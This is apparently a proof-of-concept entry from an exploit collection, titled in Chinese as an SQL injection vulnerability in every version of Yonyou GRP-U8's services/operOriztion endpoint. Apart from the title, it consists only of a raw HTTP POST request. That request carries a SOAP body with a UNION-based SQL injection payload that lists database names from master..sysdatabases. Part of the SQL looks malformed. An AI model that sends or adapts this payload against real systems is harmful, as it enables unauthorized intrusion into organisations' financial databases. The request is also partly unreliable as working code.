# 用友-GRP-U8 全版本services operOriztion sql 注入漏洞

    ```
POST /services/operOriztion HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/115.0.0.0 Safari/537.36 Connection: close Content-Length: 861
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: text/xml;charset=UTF-8
Cookie: JSESSIONID=276A2040BB09CD01F9AD891F65848109; xMsg11=1; xMsg13=1 Soapaction:
Upgrade-Insecure-Requests: 1

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
<soapenv:Header/> <soapenv:Body>
<wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<kjnd xsi:type="xsd:string">gero et' UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(107)+CHAR(112)+CHAR(113)+ISNULL(CAST(name NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)+CHAR(113) master..sysdatabases WHERE ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 9 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases ORDER BY 1) ORDER BY 1)-- xJKO</kjnd></wsdd:getGsbmfaByKjnd> </soapenv:Body>
</soapenv:Envelope>
```
